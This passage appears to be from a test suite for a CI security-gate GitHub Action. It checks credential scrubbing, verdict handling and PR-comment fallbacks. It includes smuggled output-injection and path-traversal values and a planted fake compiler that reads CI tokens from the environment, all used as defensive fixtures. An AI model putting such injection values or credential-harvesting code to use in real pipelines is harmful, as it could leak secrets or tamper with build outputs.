    token: "ghs_" + "F".repeat(36),
    owner: "o",
    repo: "r",
    issueNumber: 9,
    body: body1,
    actorLogin: bot.login,
    fetchImpl: async () => ({ ok: false, status: 403, json: async () => ({ message: "Resource not accessible" }) }),
  });
  assert.equal(denied.ok, false);
  assert.ok(/permission:403/.test(denied.reason));

  // Job summary fallback write
  const sumBase = freshBase();
  try {
    const sumPath = path.join(sumBase, "summary.md");
    writeFileSync(sumPath, "", "utf8");
    const wr = writeJobSummary(sumPath, body1);
    assert.equal(wr.ok, true);
    assert.ok(readFileSync(sumPath, "utf8").includes(PR_SUMMARY_MARKER));
  } finally {
    cleanup(sumBase);
  }
});

scenario("action runner: clean GO, secret NO-GO, failed SARIF path, fork-safe summary", async () => {
  const { runAction } = await import(pathToFileURL(path.join(__dirname, "..", "action", "main.mjs")).href);
  const actionPath = path.join(__dirname, "..");

  // --- clean GO ---
  {
    const base = freshBase();
    try {
      const repo = path.join(base, "clean");
      initRepo(repo);
      write(repo, "package.json", '{"name":"act-clean","version":"1.0.0"}\n');
      write(repo, "app.js", "console.log('ok');\n");
      commitAll(repo, "chore: clean");
      const outFile = path.join(base, "out-go.txt");
      const sumFile = path.join(base, "sum-go.md");
      writeFileSync(outFile, "", "utf8");
      writeFileSync(sumFile, "", "utf8");
      const prev = process.cwd();
      process.chdir(repo);
      try {
        const code = await runAction({
          ...buildEnv({
            GETADVANTAGE_ACTION_PATH: actionPath,
            INPUT_SARIF_FILE: "getadvantage.sarif",
            INPUT_COMMENT: "true",
            INPUT_REPORT: "false",
            GITHUB_OUTPUT: outFile,
            GITHUB_STEP_SUMMARY: sumFile,
            GITHUB_EVENT_NAME: "push",
            GITHUB_REPOSITORY: "BellmeJoe/getadvantage-cli",
            GITHUB_RUN_ID: "1",
            GETADVANTAGE_WORKSPACE: repo,
          }),
        });
        assert.equal(code, 0, "clean GO must exit 0");
        const outs = readFileSync(outFile, "utf8");
        assert.ok(/verdict=GO/.test(outs), outs);
        assert.ok(/sarif-written=true/.test(outs), outs);
        assert.ok(/sarif-upload-eligible=true/.test(outs), outs);
        assert.ok(/summary-mode=job-summary/.test(outs), outs);
        assert.ok(existsSync(path.join(repo, "getadvantage.sarif")));
        assert.ok(readFileSync(sumFile, "utf8").includes("GO"));
      } finally {
        process.chdir(prev);
      }
    } finally {
      cleanup(base);
    }
  }

  // --- secret NO-GO (injected local fetch — never contacts api.github.com) ---
  {
    const base = freshBase();
    try {
      const repo = path.join(base, "nogo");
      initRepo(repo);
      write(repo, "package.json", '{"name":"act-nogo","version":"1.0.0"}\n');
      const secret = "sk_live_" + "ACTIONRUNNERSECRET00000001";
      write(repo, "leak.js", `export const k="${secret}";\n`);
      commitAll(repo, "chore: secret");
      const outFile = path.join(base, "out-nogo.txt");
      const sumFile = path.join(base, "sum-nogo.md");
      writeFileSync(outFile, "", "utf8");
      writeFileSync(sumFile, "", "utf8");
      const prev = process.cwd();
      process.chdir(repo);
      const fetchHits = [];
      const localFetch = async (url) => {
        fetchHits.push(String(url));
        // Deny PR write → job-summary fallback; never hits the network.
        return { ok: false, status: 403, json: async () => ({ message: "Resource not accessible" }) };
      };
      try {
        const code = await runAction(
          {
            ...buildEnv({
              GETADVANTAGE_ACTION_PATH: actionPath,
              INPUT_SARIF_FILE: "getadvantage.sarif",
              INPUT_COMMENT: "true",
              INPUT_REPORT: "false",
              GITHUB_OUTPUT: outFile,
              GITHUB_STEP_SUMMARY: sumFile,
              GITHUB_EVENT_NAME: "pull_request",
              GITHUB_REPOSITORY: "BellmeJoe/getadvantage-cli",
              GITHUB_REF: "refs/pull/42/merge",
              GITHUB_RUN_ID: "2",
              GITHUB_TOKEN: "ghs_" + "notarealtokenfortests0001",
              GETADVANTAGE_WORKSPACE: repo,
            }),
          },
          { fetchImpl: localFetch },
        );
        assert.equal(code, 1, "secret NO-GO must exit 1");
        const outs = readFileSync(outFile, "utf8");
        assert.ok(/verdict=NO-GO/.test(outs), outs);
        assert.ok(!/verdict=GO/.test(outs));
        assert.ok(/summary-mode=job-summary/.test(outs), outs);
        const sum = readFileSync(sumFile, "utf8");
        assert.ok(!sum.includes(secret), "job summary must not contain fixture secret");
        assert.ok(existsSync(path.join(repo, "getadvantage.sarif")));
        const sarifRaw = readFileSync(path.join(repo, "getadvantage.sarif"), "utf8");
        assert.ok(!sarifRaw.includes(secret));
        // Attribution nonce must be bound into this run's SARIF.
        assert.ok(/getadvantage\/runNonce/.test(sarifRaw), "trusted CLI must bind run nonce");
        // All comment fetches go through the injected mock (no production network).
        assert.ok(fetchHits.length >= 1, "PR path must use injected fetchImpl");
        assert.ok(fetchHits.every((u) => typeof u === "string"));
      } finally {
        process.chdir(prev);
      }
    } finally {
      cleanup(base);
    }
  }

  // --- failed SARIF write path (directory as file) → ERROR / non-zero, not GO ---
  {
    const base = freshBase();
    try {
      const repo = path.join(base, "badsarif");
      initRepo(repo);
      write(repo, "package.json", '{"name":"act-bad","version":"1.0.0"}\n');
      write(repo, "app.js", "console.log(1);\n");
      commitAll(repo, "chore: clean");
      const badDir = path.join(repo, "not-a-file-dir");
      mkdirSync(badDir, { recursive: true });
      const outFile = path.join(base, "out-bad.txt");
      writeFileSync(outFile, "", "utf8");
      const prev = process.cwd();
      process.chdir(repo);
      try {
        const code = await runAction({
          ...buildEnv({
            GETADVANTAGE_ACTION_PATH: actionPath,
            INPUT_SARIF_FILE: "not-a-file-dir",
            INPUT_COMMENT: "false",
            INPUT_REPORT: "false",
            GITHUB_OUTPUT: outFile,
            GITHUB_EVENT_NAME: "push",
            GETADVANTAGE_WORKSPACE: repo,
          }),
        });
        assert.equal(code, 1, "failed SARIF write must not be GO");
        const outs = readFileSync(outFile, "utf8");
        assert.ok(/verdict=(NO-GO|ERROR)/.test(outs), outs);
        assert.ok(!/verdict=GO\n/.test(outs) && !/verdict=GO$/.test(outs.trim()), outs);
        assert.ok(/sarif-written=false/.test(outs), outs);
      } finally {
        process.chdir(prev);
      }
    } finally {
      cleanup(base);
    }
  }

  // --- fork-safe: no token + pull_request → job summary, never pretends PR write ---
  {
    const base = freshBase();
    try {
      const repo = path.join(base, "fork");
      initRepo(repo);
      write(repo, "package.json", '{"name":"act-fork","version":"1.0.0"}\n');
      write(repo, "app.js", "console.log(1);\n");
      commitAll(repo, "chore: clean");
      const outFile = path.join(base, "out-fork.txt");
      const sumFile = path.join(base, "sum-fork.md");
      writeFileSync(outFile, "", "utf8");
      writeFileSync(sumFile, "", "utf8");
      const prev = process.cwd();
      process.chdir(repo);
      try {
        const code = await runAction({
          ...buildEnv({
            GETADVANTAGE_ACTION_PATH: actionPath,
            INPUT_SARIF_FILE: "getadvantage.sarif",
            INPUT_COMMENT: "true",
            INPUT_REPORT: "false",
            GITHUB_OUTPUT: outFile,
            GITHUB_STEP_SUMMARY: sumFile,
            GITHUB_EVENT_NAME: "pull_request",
            GITHUB_REPOSITORY: "upstream/proj",
            GITHUB_REF: "refs/pull/3/merge",
            GETADVANTAGE_WORKSPACE: repo,
          }),
        });
        assert.equal(code, 0);
        const outs = readFileSync(outFile, "utf8");
        assert.ok(/summary-mode=job-summary/.test(outs), outs);
        assert.ok(!/summary-mode=pr-comment/.test(outs));
      } finally {
        process.chdir(prev);
      }
    } finally {
      cleanup(base);
    }
  }
});

scenario("action repair: credential scrub, output injection, stale SARIF, hostile tsc", async () => {
  const {
    runAction,
    validateSarifInputPath,
    buildCliChildEnv,
    setOutput,
  } = await import(pathToFileURL(path.join(__dirname, "..", "action", "main.mjs")).href);
  const { decideJobOutcome } = await import(
    pathToFileURL(path.join(__dirname, "..", "action", "enforce.mjs")).href
  );
  const { scrubCredentialEnv, isCredentialEnvKey } = await import(
    pathToFileURL(path.join(__dirname, "..", "util.mjs")).href
  );
  const actionPath = path.join(__dirname, "..");

  // --- P2 exact state: gate=GO/success + upload=failure → required check fails ---
  {
    const goUploadFail = decideJobOutcome({
      verdict: "GO",
      gateOutcome: "success",
      sarifWritten: true,
      uploadSkip: false,
      uploadEligible: true,
      uploadOutcome: "failure",
    });
    assert.equal(goUploadFail.exitCode, 1, "GO + upload failure must not be green");
    assert.equal(goUploadFail.reason, "sarif-upload-failed");

    const goUploadOk = decideJobOutcome({
      verdict: "GO",
      gateOutcome: "success",
      sarifWritten: true,
      uploadSkip: false,
      uploadEligible: true,
      uploadOutcome: "success",
    });
    assert.equal(goUploadOk.exitCode, 0);

    const goForkSkip = decideJobOutcome({
      verdict: "GO",
      gateOutcome: "success",
      sarifWritten: true,
      uploadSkip: true,
      uploadEligible: false,
      uploadOutcome: "skipped",
    });
    assert.equal(goForkSkip.exitCode, 0, "explicit fork skip may stay green on GO");

    // P1: eligible upload with outcome=skipped must be red (not a fork skip).
    const eligibleSkipped = decideJobOutcome({
      verdict: "GO",
      gateOutcome: "success",
      sarifWritten: true,
      uploadSkip: false,
      uploadEligible: true,
      uploadOutcome: "skipped",
    });
    assert.equal(eligibleSkipped.exitCode, 1, "eligible+skipped must not be green");
    assert.equal(eligibleSkipped.reason, "sarif-upload-skipped-eligible");

    const nogoUploadOk = decideJobOutcome({
      verdict: "NO-GO",
      gateOutcome: "failure",
      sarifWritten: true,
      uploadSkip: false,
      uploadEligible: true,
      uploadOutcome: "success",
    });
    assert.equal(nogoUploadOk.exitCode, 1, "NO-GO stays red even if upload succeeded");
  }

  // --- unit: scrub removes GitHub / OIDC / npm / getAdvantage credentials ---
  const dirty = {
    PATH: process.env.PATH || "",
    GITHUB_TOKEN: "ghs_" + "SCRUBME".repeat(6),
    GH_TOKEN: "ghp_" + "SCRUBME".repeat(5),
    ACTIONS_ID_TOKEN_REQUEST_TOKEN: "oidc-secret-token-value-xx",
    ACTIONS_ID_TOKEN_REQUEST_URL: "https://example.test/oidc",
    ACTIONS_RUNTIME_TOKEN: "runtime-token-value-xx",
    GETADVANTAGE_API_KEY: "adv_live_" + "scrubme00000001",
    GETADVANTAGE_REPORT: "1",
    NPM_TOKEN: "npm_" + "scrubtoken00000001",
    NODE_AUTH_TOKEN: "npm_" + "scrubtoken00000002",
    MY_CUSTOM_SECRET: "should-go",
    SAFE_FLAG: "keep-me",
  };
  const scrubbed = scrubCredentialEnv(dirty);
  assert.equal(scrubbed.SAFE_FLAG, "keep-me");
  assert.ok(scrubbed.PATH);
  for (const k of [
    "GITHUB_TOKEN",
    "GH_TOKEN",
    "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
    "ACTIONS_ID_TOKEN_REQUEST_URL",
    "ACTIONS_RUNTIME_TOKEN",
    "GETADVANTAGE_API_KEY",
    "GETADVANTAGE_REPORT",
    "NPM_TOKEN",
    "NODE_AUTH_TOKEN",
    "MY_CUSTOM_SECRET",
  ]) {
    assert.equal(scrubbed[k], undefined, `scrub must drop ${k}`);
    assert.equal(isCredentialEnvKey(k) || k === "MY_CUSTOM_SECRET", true);
  }
  const cliEnv = buildCliChildEnv(
    { ...dirty, GETADVANTAGE_API_KEY: dirty.GETADVANTAGE_API_KEY },
    { wantReport: false },
  );
  assert.equal(cliEnv.GITHUB_TOKEN, undefined);
  assert.equal(cliEnv.GETADVANTAGE_API_KEY, undefined);
  const cliReport = buildCliChildEnv(dirty, { wantReport: true });
  assert.equal(cliReport.GITHUB_TOKEN, undefined);
  assert.equal(cliReport.GETADVANTAGE_API_KEY, dirty.GETADVANTAGE_API_KEY);
  assert.equal(cliReport.ACTIONS_ID_TOKEN_REQUEST_TOKEN, undefined);

  // --- unit: SARIF path validation + GITHUB_OUTPUT injection rejection ---
  const ws = path.join(freshBase(), "ws");
  mkdirSync(ws, { recursive: true });
  try {
    assert.equal(validateSarifInputPath("getadvantage.sarif", ws, ws).ok, true);
    assert.equal(validateSarifInputPath("out/dir/x.sarif", ws, ws).ok, true);
    assert.equal(validateSarifInputPath("evil\ninjected=1", ws, ws).ok, false);
    assert.equal(validateSarifInputPath("evil\rinjected=1", ws, ws).ok, false);
    assert.equal(validateSarifInputPath("a\u0000b.sarif", ws, ws).ok, false);
    assert.equal(validateSarifInputPath("../outside.sarif", ws, ws).ok, false);
    assert.equal(validateSarifInputPath("/tmp/abs.sarif", ws, ws).ok, false);
    assert.equal(validateSarifInputPath("C:\\abs\\x.sarif", ws, ws).ok, false);

    const outFile = path.join(ws, "github-output.txt");
    writeFileSync(outFile, "", "utf8");
    const envOut = { GITHUB_OUTPUT: outFile };
    setOutput("verdict", "GO", envOut);
    setOutput("sarif-path", "getadvantage.sarif", envOut);
    // Hostile: newline would create a second key if not rejected
    setOutput("sarif-path", "evil.sarif\ninjected-key=pwned", envOut);
    const rawOut = readFileSync(outFile, "utf8");
    assert.ok(/verdict=GO/.test(rawOut));
    assert.ok(!/injected-key=pwned/.test(rawOut), `must not allow output-key injection:\n${rawOut}`);
    assert.ok(!/^injected-key=/m.test(rawOut));
  } finally {
    cleanup(path.dirname(ws));
  }

  // --- hostile compiler: local tsc must not see credentials ---
  {
    const base = freshBase();
    try {
      const repo = path.join(base, "hostile-tsc");
      initRepo(repo);
      write(
        repo,
        "package.json",
        JSON.stringify(
          {
            name: "hostile-tsc",
            version: "1.0.0",
            devDependencies: { typescript: "5.0.0" },
          },
          null,
          2,
        ) + "\n",
      );
      write(repo, "tsconfig.json", '{"compilerOptions":{"strict":true},"include":["*.ts"]}\n');
      write(repo, "index.ts", "export const x: number = 1;\n");
      // Synthetic local typescript bin that attempts to exfiltrate credentials
      const tscDir = path.join(repo, "node_modules", "typescript", "bin");
      mkdirSync(tscDir, { recursive: true });
      const canaries = {
        GITHUB_TOKEN: "ghs_" + "HOSTILETSCTOKEN00000000001",
        GETADVANTAGE_API_KEY: "adv_live_" + "hostiletsc000001",
        ACTIONS_ID_TOKEN_REQUEST_TOKEN: "oidc_hostile_tsc_token_xx",
        NPM_TOKEN: "npm_" + "hostiletsc00000000001",
        NODE_AUTH_TOKEN: "npm_" + "hostiletsc00000000002",
      };
      write(
        repo,
        path.join("node_modules", "typescript", "bin", "tsc"),
        `#!/usr/bin/env node
const keys = ${JSON.stringify(Object.keys(canaries))};
const found = [];
for (const k of keys) {
  if (process.env[k]) found.push(k + "=" + process.env[k]);
}
if (found.length) {
  console.error("HOSTILE_TSC_LEAK:" + found.join("|"));
  process.exit(2);
}
console.log("hostile-tsc: clean env");
process.exit(0);
`,
      );
      commitAll(repo, "chore: hostile tsc fixture");

      // Direct gate under a credential-laden parent env (simulates Action shell)
      const r = run(["check", "--json", "--no-brief-check", "--no-overview"], repo, {
        GITHUB_TOKEN: canaries.GITHUB_TOKEN,
        GETADVANTAGE_API_KEY: canaries.GETADVANTAGE_API_KEY,
        ACTIONS_ID_TOKEN_REQUEST_TOKEN: canaries.ACTIONS_ID_TOKEN_REQUEST_TOKEN,
        ACTIONS_ID_TOKEN_REQUEST_URL: "https://example.test/oidc",
        NPM_TOKEN: canaries.NPM_TOKEN,
        NODE_AUTH_TOKEN: canaries.NODE_AUTH_TOKEN,
        INPUT_REPORT: "false",
      });
      const blob = r.stdout + r.stderr;
      assert.ok(!blob.includes("HOSTILE_TSC_LEAK"), `tsc must not see credentials:\n${blob.slice(0, 800)}`);
      for (const v of Object.values(canaries)) {
        assert.ok(!blob.includes(v), `credential value must not appear in gate output: ${v.slice(0, 12)}…`);
      }
      // Typecheck should pass (our synthetic tsc exits 0 with clean env)
      const doc = JSON.parse(r.stdout.trim().includes("{") ? r.stdout.trim().slice(r.stdout.indexOf("{")) : "{}");
      // Parse JSON doc if present
      let parsed = null;
      try {
        parsed = JSON.parse(r.stdout.trim());
      } catch {
        const s = r.stdout.indexOf("{");
        const e = r.stdout.lastIndexOf("}");
        if (s >= 0 && e > s) parsed = JSON.parse(r.stdout.slice(s, e + 1));
      }
      assert.ok(parsed, "expected JSON gate document");
      const tc = (parsed.checks || []).find((c) => /typecheck/i.test(c.label || ""));
      assert.ok(tc, "typecheck check should run");
      assert.equal(tc.status, "pass", `typecheck should pass with scrubbed env: ${JSON.stringify(tc)}`);

      // Action path: parent has tokens; child CLI + tsc must not leak them
      const outFile = path.join(base, "out-tsc.txt");
      const sumFile = path.join(base, "sum-tsc.md");
      writeFileSync(outFile, "", "utf8");
      writeFileSync(sumFile, "", "utf8");
      const prev = process.cwd();
      process.chdir(repo);
      try {
        const code = await runAction({
          ...buildEnv({
            GETADVANTAGE_ACTION_PATH: actionPath,
            INPUT_SARIF_FILE: "getadvantage.sarif",
            INPUT_COMMENT: "false",
            INPUT_REPORT: "false",
            GITHUB_OUTPUT: outFile,
            GITHUB_STEP_SUMMARY: sumFile,
            GITHUB_EVENT_NAME: "push",
            GITHUB_TOKEN: canaries.GITHUB_TOKEN,
            GETADVANTAGE_API_KEY: canaries.GETADVANTAGE_API_KEY,
            ACTIONS_ID_TOKEN_REQUEST_TOKEN: canaries.ACTIONS_ID_TOKEN_REQUEST_TOKEN,
            NPM_TOKEN: canaries.NPM_TOKEN,
            NODE_AUTH_TOKEN: canaries.NODE_AUTH_TOKEN,
            GETADVANTAGE_WORKSPACE: repo,
          }),
        });
        const outs = readFileSync(outFile, "utf8");
        const sum = readFileSync(sumFile, "utf8");
        const all = outs + sum + String(code);
        assert.ok(!all.includes("HOSTILE_TSC_LEAK"));
        for (const v of Object.values(canaries)) {
          assert.ok(!outs.includes(v), "GITHUB_OUTPUT must not contain credential");
          assert.ok(!sum.includes(v), "summary must not contain credential");
        }
      } finally {
        process.chdir(prev);
      }
    } finally {
      cleanup(base);
    }
  }

  // --- newline / control SARIF path rejected by Action (not GO, no injection) ---
  {
    const base = freshBase();
    try {
      const repo = path.join(base, "inject");
      initRepo(repo);
      write(repo, "package.json", '{"name":"act-inject","version":"1.0.0"}\n');
      write(repo, "app.js", "console.log(1);\n");
      commitAll(repo, "chore: clean");
      const outFile = path.join(base, "out-inject.txt");
      writeFileSync(outFile, "", "utf8");
      const prev = process.cwd();
      process.chdir(repo);
      try {
        const code = await runAction({
          ...buildEnv({
            GETADVANTAGE_ACTION_PATH: actionPath,
            INPUT_SARIF_FILE: "evil.sarif\ninjected=pwned",
            INPUT_COMMENT: "false",
            INPUT_REPORT: "false",
            GITHUB_OUTPUT: outFile,
            GITHUB_EVENT_NAME: "push",
            GETADVANTAGE_WORKSPACE: repo,
          }),
        });
        assert.equal(code, 1);
        const outs = readFileSync(outFile, "utf8");
        assert.ok(/verdict=ERROR/.test(outs), outs);
        assert.ok(!/injected=pwned/.test(outs), outs);
        assert.ok(/sarif-written=false/.test(outs), outs);
      } finally {
        process.chdir(prev);
      }
    } finally {
      cleanup(base);
    }
  }

  // --- stale pre-existing SARIF + fatal gate must not set sarif-written=true ---
  {
    const base = freshBase();
    try {
      const repo = path.join(base, "stale");
      initRepo(repo);
      write(repo, "package.json", '{"name":"act-stale","version":"1.0.0"}\n');
      // Directory-as-path is invalid; instead: pre-write SARIF, then make gate fail
      // before rewrite by using a path that cannot be written (parent is a file).
      // Simpler: pre-write SARIF, then point INPUT at a name whose write fails by
      // using a secret so gate is NO-GO — but CLI still rewrites SARIF on NO-GO.
      // True stale path: pre-existing file + INPUT path that resolves to a directory
      // is already covered. For unchanged file: use a SARIF path that the CLI cannot
      // overwrite because we make the path a directory after... no.
      // Approach: pre-write getadvantage.sarif, then run with INPUT_SARIF_FILE that
      // is valid but we monkey-patch by making the parent of a nested path a file.
      // Cleanest proof: call runAction after placing a SARIF file and forcing CLI
      // to fail before write by using an invalid nested path under a file node.
      write(repo, "blocker", "not-a-dir");
      write(repo, "getadvantage.sarif", '{"version":"2.1.0","runs":[],"stale":true}\n');
      // Also commit a secret so even if write worked we'd be NO-GO — but write to
      // blocker/nested.sarif fails because blocker is a file.
      write(repo, "leak.js", 'export const k="sk_live_STALESARIFSECRET00000001";\n');
      commitAll(repo, "chore: stale fixture");
      // Force mtime stability: re-stat after a tiny delay is flaky; instead compare
      // that when CLI cannot write to the requested path, pre-existing sibling is
      // not claimed. Use INPUT path = getadvantage.sarif but delete write by making
      // the path a directory after snapshot... actually main snapshots then runs CLI
      // which overwrites. To keep file unchanged: make path a directory so write fails.
      rmSync(path.join(repo, "getadvantage.sarif"));
      mkdirSync(path.join(repo, "getadvantage.sarif"), { recursive: true });
      // Wait — directory means isRegularFile false, so sarif-written=false always.
      // Real case from review: pre-existing *file* unchanged. CLI write must no-op.
      // Simulate: snapshot pre file; spawn a CLI that does not write by using
      // --sarif path the CLI rejects... empty is invalid. Use directory path again.
      //
      // Better approach: write stale file, run Action with INPUT_SARIF_FILE that
      // validates but CLI writes elsewhere? No.
      // Use util: after failed write, file unchanged → isCurrentSarifWrite false.
      // Implement by pointing at a read-only location — on Windows chmod is weak.
      //
      // Practical non-circular test: import is not enough — run with pre-existing
      // file and a broken CLI entry? Too heavy.
      //
      // Use nested path where parent does not exist and we replace writeFile with
      // failure by targeting a path containing a file component:
      //   stale.sarif exists as file content; we request "stale.sarif" but the gate
      //   process is the real CLI which WILL rewrite it.
      //
      // Force real CLI not to write: only happens on path error. So:
      rmSync(path.join(repo, "getadvantage.sarif"), { recursive: true, force: true });
      write(repo, "stale.sarif", '{"version":"2.1.0","runs":[{"tool":{"driver":{"name":"stale"}}}],"x":"STALE_MARKER"}\n');
      // Freeze mtime by writing then using INPUT that fails validation... no.
      // Direct unit of isCurrentSarifWrite via public runAction behavior:
      // spawn with GETADVANTAGE_ACTION_PATH pointing to a fake CLI that exits NO-GO
      // without writing SARIF.
      const fakeActionRoot = path.join(base, "fake-action");
      mkdirSync(fakeActionRoot, { recursive: true });
      writeFileSync(
        path.join(fakeActionRoot, "index.mjs"),
        `#!/usr/bin/env node
// Fake CLI: print NO-GO JSON, do not write SARIF.
console.log(JSON.stringify({
  verdict: "NO-GO",
  exitCode: 1,
  checks: [{ status: "fail", label: "Fatal gate", detail: "boom" }],
}));
process.exit(1);
`,
        "utf8",
      );
      // Copy util dependency for cliVersion — runAction imports from parent util via
      // action/main which uses GETADVANTAGE_ACTION_PATH only for index.mjs.
      const outFile = path.join(base, "out-stale.txt");
      writeFileSync(outFile, "", "utf8");
      // Place stale SARIF in the real repo; Action uses fake CLI that never rewrites it
      write(repo, "stale.sarif", '{"version":"2.1.0","runs":[],"STALE_MARKER":true}\n');
      const prev = process.cwd();
      process.chdir(repo);
      try {
        const code = await runAction({
          ...buildEnv({
            GETADVANTAGE_ACTION_PATH: fakeActionRoot,
            INPUT_SARIF_FILE: "stale.sarif",
            INPUT_COMMENT: "false",
            INPUT_REPORT: "false",
            GITHUB_OUTPUT: outFile,
            GITHUB_EVENT_NAME: "push",
            GETADVANTAGE_WORKSPACE: repo,
          }),
        });
        assert.equal(code, 1);
        const outs = readFileSync(outFile, "utf8");
        assert.ok(/verdict=NO-GO/.test(outs), outs);
        assert.ok(/sarif-written=false/.test(outs), `stale file must not count as written:\n${outs}`);
        assert.ok(/sarif-upload-eligible=false/.test(outs), outs);
        assert.ok(/sarif-path=$/m.test(outs) || /sarif-path=\s*$/m.test(outs), outs);
        assert.ok(readFileSync(path.join(repo, "stale.sarif"), "utf8").includes("STALE_MARKER"));
      } finally {
        process.chdir(prev);
      }
    } finally {
      cleanup(base);
    }
  }
});

scenario("action enforce: GO+upload failure fails; NO-GO+upload success fails; fork skip allows GO", async () => {
  const { decideJobOutcome, shouldSkipSarifUploadForFork, runEnforceFromEnv } = await import(
    pathToFileURL(path.join(__dirname, "..", "action", "enforce.mjs")).href
  );

  // gate GO + upload failure → never green
  const goUploadFail = decideJobOutcome({
    verdict: "GO",
    gateOutcome: "success",
    sarifWritten: "true",
    uploadSkip: "false",
    uploadOutcome: "failure",
  });
  assert.equal(goUploadFail.exitCode, 1);
  assert.equal(goUploadFail.reason, "sarif-upload-failed");

  // gate NO-GO + upload success → still fail required check
  const nogoUploadOk = decideJobOutcome({
    verdict: "NO-GO",
    gateOutcome: "failure",
    sarifWritten: "true",
    uploadSkip: "false",
    uploadOutcome: "success",
  });
  assert.equal(nogoUploadOk.exitCode, 1);
  assert.ok(nogoUploadOk.reason === "NO-GO" || nogoUploadOk.exitCode === 1);

  // fork skip + GO + gate success → green (honest non-attempt)
  const forkGo = decideJobOutcome({
    verdict: "GO",
    gateOutcome: "success",
    sarifWritten: "true",
    uploadSkip: "true",
    uploadOutcome: "skipped",
  });
  assert.equal(forkGo.exitCode, 0);
  assert.equal(forkGo.reason, "go-upload-skipped-fork");

  // GO + upload success → green
  const goOk = decideJobOutcome({
    verdict: "GO",
    gateOutcome: "success",
    sarifWritten: "true",
    uploadSkip: "false",
    uploadOutcome: "success",
  });
  assert.equal(goOk.exitCode, 0);

  // Behavioral: eligible + skipped → red (only success is acceptable when eligible)
  const eligibleSkipped = decideJobOutcome({
    verdict: "GO",
    gateOutcome: "success",
    sarifWritten: "true",
    uploadSkip: "false",
    uploadOutcome: "skipped",
  });
  assert.equal(eligibleSkipped.exitCode, 1);
  assert.equal(eligibleSkipped.reason, "sarif-upload-skipped-eligible");
  const envSkipped = runEnforceFromEnv({
    GETADVANTAGE_VERDICT: "GO",
    GETADVANTAGE_GATE_OUTCOME: "success",
    GETADVANTAGE_SARIF_WRITTEN: "true",
    GETADVANTAGE_UPLOAD_SKIP: "false",
    GETADVANTAGE_UPLOAD_OUTCOME: "skipped",
  });
  assert.equal(envSkipped, 1, "CLI enforce: eligible+skipped must exit 1");

  // Fork detection
  assert.equal(
    shouldSkipSarifUploadForFork({
      eventName: "pull_request",
      isFork: "true",
      headRepo: "forker/proj",
      baseRepo: "upstream/proj",
    }).skip,
    true,
  );
  assert.equal(
    shouldSkipSarifUploadForFork({
      eventName: "pull_request",
      isFork: "false",
      headRepo: "upstream/proj",
      baseRepo: "upstream/proj",
    }).skip,
    false,
  );
  assert.equal(
    shouldSkipSarifUploadForFork({
      eventName: "push",
      isFork: "true",
      headRepo: "a/b",
      baseRepo: "c/d",
    }).skip,
    false,
  );

  // Cold enforce CLI: upload-decide writes skip + job summary note
  const base = freshBase();
  try {
    const outFile = path.join(base, "out.txt");
    const sumFile = path.join(base, "sum.md");
    writeFileSync(outFile, "", "utf8");
    writeFileSync(sumFile, "", "utf8");
    const code = runEnforceFromEnv({
      GETADVANTAGE_ENFORCE_MODE: "upload-decide",
      GITHUB_EVENT_NAME: "pull_request",
      GETADVANTAGE_PR_IS_FORK: "true",
      GETADVANTAGE_PR_HEAD_REPO: "forker/x",
      GITHUB_REPOSITORY: "upstream/x",
      GITHUB_OUTPUT: outFile,
      GITHUB_STEP_SUMMARY: sumFile,
    });
    assert.equal(code, 0);
    const outs = readFileSync(outFile, "utf8");
    assert.ok(/skip=true/.test(outs), outs);
    assert.ok(/reason=fork-pr/.test(outs), outs);
    const sum = readFileSync(sumFile, "utf8");
    assert.ok(/Skipped: fork/i.test(sum), sum);
    assert.ok(!/upload succeeded/i.test(sum));

    // Cold: GO + upload failure via env CLI
    const failCode = runEnforceFromEnv({
      GETADVANTAGE_VERDICT: "GO",
      GETADVANTAGE_GATE_OUTCOME: "success",
      GETADVANTAGE_SARIF_WRITTEN: "true",
      GETADVANTAGE_UPLOAD_SKIP: "false",
      GETADVANTAGE_UPLOAD_OUTCOME: "failure",
    });
    assert.equal(failCode, 1);
  } finally {
    cleanup(base);
  }
});

scenario("action repair pass-2: pull_request_target refuse, SARIF digest, actor ownership, page cap, release contract", async () => {
  const {
    runAction,
    fileSnapshot,
    isCurrentSarifWrite,
  } = await import(pathToFileURL(path.join(__dirname, "..", "action", "main.mjs")).href);
  const {
    PR_SUMMARY_MARKER,
    buildSummaryMarkdown,
    isBotOwnedMarkerComment,
    isVerifiedBotLogin,
    upsertPrComment,
    COMMENT_PAGE_SIZE,
    COMMENT_PAGE_CAP,
  } = await import(pathToFileURL(path.join(__dirname, "..", "action", "summary.mjs")).href);
  const {
    planActionRelease,
    parsePackageVersion,
    exactTagName,
    actionMajorTagForVersion,
    githubRefApiRequest,
    validatePublishWorkflowContract,
    ACTION_MAJOR_TAG,
  } = await import(pathToFileURL(path.join(__dirname, "..", "ops", "action-release.mjs")).href);
  const actionPath = path.join(__dirname, "..");

  // --- 1. Hard-refuse pull_request_target: no child CLI, no SARIF claim, exit 1 ---
  {
    const base = freshBase();
    try {
      const repo = path.join(base, "prt");
      initRepo(repo);
      write(repo, "package.json", '{"name":"act-prt","version":"1.0.0"}\n');
      write(repo, "app.js", "console.log(1);\n");
      commitAll(repo, "chore: clean");
      // Pre-existing SARIF must not be claimed as written this run.
      write(
        repo,
        "getadvantage.sarif",
        JSON.stringify({ version: "2.1.0", runs: [{ tool: { driver: { name: "stale" } } }] }) + "\n",
      );
      const fakeActionRoot = path.join(base, "fake-cli-must-not-run");
      mkdirSync(fakeActionRoot, { recursive: true });
      const ranFlag = path.join(base, "child-ran.txt");
      writeFileSync(
        path.join(fakeActionRoot, "index.mjs"),
        `import { writeFileSync } from "node:fs";
writeFileSync(${JSON.stringify(ranFlag)}, "RAN", "utf8");
console.log(JSON.stringify({ verdict: "GO", exitCode: 0, checks: [] }));
process.exit(0);
`,
        "utf8",
      );
      const outFile = path.join(base, "out-prt.txt");
      const sumFile = path.join(base, "sum-prt.md");
      writeFileSync(outFile, "", "utf8");
      writeFileSync(sumFile, "", "utf8");
      const prev = process.cwd();
      process.chdir(repo);
      try {
        const code = await runAction({
          ...buildEnv({
            GETADVANTAGE_ACTION_PATH: fakeActionRoot,
            INPUT_SARIF_FILE: "getadvantage.sarif",
            INPUT_COMMENT: "true",
            INPUT_REPORT: "false",
            GITHUB_OUTPUT: outFile,
            GITHUB_STEP_SUMMARY: sumFile,
            GITHUB_EVENT_NAME: "pull_request_target",
            GITHUB_REPOSITORY: "BellmeJoe/getadvantage-cli",
            GITHUB_REF: "refs/pull/99/merge",
            GITHUB_TOKEN: "ghs_" + "MUSTNOTUSE000000000000001",
            GITHUB_ACTOR: "attacker",
